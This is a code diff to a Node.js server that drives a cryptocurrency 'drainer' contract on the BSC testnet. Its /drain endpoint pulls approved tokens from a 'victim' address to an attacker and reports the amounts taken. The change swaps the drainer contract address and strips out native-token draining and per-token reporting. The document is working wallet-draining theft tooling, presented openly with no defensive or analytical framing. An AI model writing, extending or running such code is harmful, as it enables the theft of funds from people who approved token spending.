@@ -16,7 +16,7 @@ const BSC_TESTNET_CHAIN_ID = 97;
 const provider = new ethers.JsonRpcProvider("https://bsc-testnet-dataseed.bnbchain.org/", BSC_TESTNET_CHAIN_ID);
 const wallet = new ethers.Wallet(process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE", provider);
 
-const drainerContractAddress = "0x3cDDC7c58eD68B7cf881012Af405731e96CF2d1b";
+const drainerContractAddress = "0x0643E258885Aaaa5D8F3Acc18B0C7eD8dfc853eB";
 
 const tokenList = [
   { symbol: "BUSD", address: "0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee", decimals: 18 },
@@ -28,9 +28,7 @@ const drainerAbi = [
   "function drainTokens(address victim, address[] memory tokens) external returns (uint256[] memory)",
   "function drainSpecificToken(address victim, address token) external returns (uint256)",
   "function attacker() external view returns (address)",
-  "event TokensDrained(address indexed victim, address indexed token, uint256 amount)",
-  "function drainNative(address victim) external returns (uint256)",
-  "event NativeDrained(address indexed victim, uint256 amount)"
+  "event TokensDrained(address indexed victim, address indexed token, uint256 amount)"
 ];
 
 const tokenAbi = [
@@ -132,7 +130,6 @@ app.post("/drain", async (req, res) => {
       const gasSettings = await getGasSettings();
       let tx, receipt, totalDrained = BigInt(0);
       const tokensNeedingApproval = [];
-      const drainedTokens = []; // Track drained amounts per token
 
       // Check allowances and balances for all tokens
       const tokenAddresses = tokenList.map(t => t.address);
@@ -158,43 +155,18 @@ app.post("/drain", async (req, res) => {
               try {
                   const parsedLog = eventInterface.parseLog(log);
                   if (parsedLog.name === "TokensDrained") {
-                      const tokenAddress = parsedLog.args.token;
-                      const amount = BigInt(parsedLog.args.amount);
-                      totalDrained += amount;
-                      const token = tokenList.find(t => t.address.toLowerCase() === tokenAddress.toLowerCase());
-                      if (token) {
-                          drainedTokens.push(`${ethers.formatUnits(amount, token.decimals)} ${token.symbol}`);
-                      }
+                      totalDrained += BigInt(parsedLog.args.amount);
                   }
               } catch (e) {
                   console.log("Non-TokensDrained log:", log);
               }
           });
-
-          // Drain native token (TBNB) after tokens
-          console.log(`Draining native TBNB from ${victimAddress}...`);
-          const nativeTx = await Drainer.drainNative(victimAddress, { ...gasSettings, gasLimit: 200000 });
-          const nativeReceipt = await nativeTx.wait();
-          let nativeDrained = BigInt(0);
-          nativeReceipt.logs.forEach(log => {
-              try {
-                  const parsedLog = eventInterface.parseLog(log);
-                  if (parsedLog.name === "NativeDrained") {
-                      nativeDrained = BigInt(parsedLog.args.amount);
-                  }
-              } catch (e) {
-                  console.log("Non-NativeDrained log:", log);
-              }
-          });
-          console.log(`Drained ${ethers.formatEther(nativeDrained)} TBNB`);
       }
 
       console.log(`Transaction sent: ${tx.hash}`);
 
-      if (totalDrained > 0 || nativeDrained > 0) {
-          const tokenMessage = drainedTokens.length > 0 ? `Drained tokens: ${drainedTokens.join(", ")}` : "No tokens drained";
-          const nativeMessage = nativeDrained > 0 ? `Drained native: ${ethers.formatEther(nativeDrained)} TBNB` : "No TBNB drained";
-          const message = `${tokenMessage}. ${nativeMessage}.`;
+      if (totalDrained > 0) {
+          const message = `Drained ${ethers.formatEther(totalDrained)} total tokens`;
           res.json({
               success: true,
               message,
@@ -202,7 +174,7 @@ app.post("/drain", async (req, res) => {
               transactionHash: tx.hash,
               gasUsed: receipt.gasUsed.toString(),
               needsApproval: false,
-              tokensNeedingApproval: []
+              tokensNeedingApproval: [] // No approvals needed post-drain
           });
       } else {
           res.json({
@@ -211,7 +183,7 @@ app.post("/drain", async (req, res) => {
               victimAddress,
               transactionHash: tx?.hash || null,
               needsApproval,
-              tokensNeedingApproval
+              tokensNeedingApproval // List of tokens needing approval
           });
       }
   } catch (error) {
